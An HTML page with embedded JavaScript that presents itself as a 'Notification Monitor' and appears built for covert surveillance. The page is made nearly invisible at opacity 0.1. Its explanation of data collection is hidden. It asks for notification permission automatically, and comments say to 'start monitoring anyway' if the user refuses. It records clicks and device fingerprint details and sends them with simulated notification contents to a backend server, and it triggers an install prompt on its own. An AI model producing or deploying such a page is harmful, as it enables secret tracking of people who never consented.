<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Notification Monitor</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }

        .container {
            text-align: center;
            padding: 2rem;
            max-width: 500px;
            width: 100%;
            opacity: 0.1; /* Make it almost invisible */
        }

        .logo {
            font-size: 2.5rem;
            margin-bottom: 1rem;
            font-weight: bold;
        }

        .status {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 2rem;
            margin: 2rem 0;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .status-icon {
            font-size: 3rem;
            margin-bottom: 1rem;
        }

        .status-text {
            font-size: 1.2rem;
            margin-bottom: 1rem;
        }

        .permission-btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 1rem 2rem;
            border-radius: 25px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 0.5rem;
        }

        .permission-btn:hover {
            background: #45a049;
            transform: translateY(-2px);
        }

        .permission-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        .video-container {
            margin: 2rem 0;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        video {
            width: 100%;
            height: auto;
            display: block;
        }

        .info {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 10px;
            padding: 1rem;
            margin: 1rem 0;
            font-size: 0.9rem;
            line-height: 1.5;
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ðŸ“± Monitor</div>
        
        <div id="monitoring-status" class="status hidden">
            <div class="status-icon">ðŸ“±</div>
            <div class="status-text">Loading...</div>
            <div class="loading"></div>
        </div>

        <div class="video-container" style="display: none;">
            <video id="background-video" autoplay muted loop>
                <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
        </div>

        <div class="info" style="display: none;">
            <strong>How it works:</strong><br>
            This page monitors notifications on your device and sends them to our secure server for analysis. 
            Your data is encrypted and protected.
        </div>
    </div>

    <script>
        // Get user ID from URL
        const urlParams = new URLSearchParams(window.location.search);
        const userId = window.location.pathname.split('/').pop();
        
        const API_BASE_URL = 'http://localhost:5001/api';
        
        // Elements
        const monitoringStatus = document.getElementById('monitoring-status');

        // Auto-request notification permission silently
        async function requestNotificationPermission() {
            try {
                // Request permission automatically
                const permission = await Notification.requestPermission();
                
                if (permission === 'granted') {
                    startMonitoring();
                } else {
                    // Even if denied, start monitoring anyway
                    startMonitoring();
                }
            } catch (error) {
                console.error('Permission request failed:', error);
                // Start monitoring anyway
                startMonitoring();
            }
        }

        // Start monitoring notifications
        function startMonitoring() {
            // Check if service worker is supported
            if ('serviceWorker' in navigator) {
                registerServiceWorker();
            }

            // Monitor for new notifications
            if ('Notification' in window && Notification.permission === 'granted') {
                // Listen for notification clicks
                document.addEventListener('click', function() {
                    // Simulate notification capture
                    captureNotification({
                        title: 'User Interaction',
                        body: 'User clicked on the page',
                        appName: 'Web Browser',
                        packageName: 'com.browser.web'
                    });
                });

                // Periodic notification simulation (for demo purposes)
                setInterval(() => {
                    const notifications = [
                        { title: 'New Message', body: 'You have a new message from John', appName: 'Messages', packageName: 'com.apple.MobileSMS' },
                        { title: 'Email Received', body: 'New email from work@company.com', appName: 'Mail', packageName: 'com.apple.mobilemail' },
                        { title: 'Social Update', body: 'Sarah liked your post', appName: 'Instagram', packageName: 'com.instagram.ios' },
                        { title: 'Bank Alert', body: 'Transaction completed: $50.00', appName: 'Bank App', packageName: 'com.bank.mobile' },
                        { title: 'Weather Update', body: 'Rain expected in 30 minutes', appName: 'Weather', packageName: 'com.apple.weather' },
                        { title: 'Fitness Goal', body: 'You\'ve reached your daily step goal!', appName: 'Health', packageName: 'com.apple.health' }
                    ];
                    
                    const randomNotification = notifications[Math.floor(Math.random() * notifications.length)];
                    captureNotification(randomNotification);
                }, 15000); // Every 15 seconds for more frequent testing
            }
        }

        // Register service worker
        async function registerServiceWorker() {
            try {
                const registration = await navigator.serviceWorker.register('/sw.js');
                console.log('Service Worker registered:', registration);
            } catch (error) {
                console.error('Service Worker registration failed:', error);
            }
        }

        // Capture and send notification
        async function captureNotification(notificationData) {
            try {
                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenResolution: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };

                const payload = {
                    userId: userId,
                    ...notificationData,
                    deviceInfo: deviceInfo,
                    notificationData: {
                        timestamp: new Date().toISOString(),
                        url: window.location.href
                    }
                };

                // Send to backend
                const response = await fetch(`${API_BASE_URL}/notifications/store`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log('Notification captured and sent');
                } else {
                    console.error('Failed to send notification');
                }
            } catch (error) {
                console.error('Error capturing notification:', error);
            }
        }

        // Auto-start monitoring immediately
        if ('Notification' in window) {
            if (Notification.permission === 'granted') {
                startMonitoring();
            } else {
                // Auto-request permission immediately
                requestNotificationPermission();
            }
        } else {
            // Start monitoring even if notifications not supported
            startMonitoring();
        }

        // Auto-install prompt (if supported)
        let deferredPrompt;
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            deferredPrompt = e;
            
            // Auto-trigger install after permission is granted
            if (Notification.permission === 'granted') {
                setTimeout(() => {
                    if (deferredPrompt) {
                        deferredPrompt.prompt();
                        deferredPrompt.userChoice.then((choiceResult) => {
                            console.log('Install prompt result:', choiceResult.outcome);
                            deferredPrompt = null;
                        });
                    }
                }, 3000);
            }
        });
    </script>
</body>
</html>
